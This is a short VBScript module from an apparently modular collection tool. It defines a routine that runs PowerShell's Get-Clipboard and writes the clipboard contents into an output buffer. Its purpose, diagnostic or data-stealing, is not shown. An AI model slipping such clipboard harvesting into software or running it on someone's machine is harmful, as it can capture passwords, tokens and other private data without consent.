' chunk: collectors/clipboard
' depends: core/emit_buffer, core/run_cmd
' provides: collect_clipboard
' format: vbscript

Sub collect_clipboard()
    emit vbCrLf & "=== CLIPBOARD ===" & vbCrLf
    emit _run("powershell -Command ""Get-Clipboard 2>$null""")
End Sub
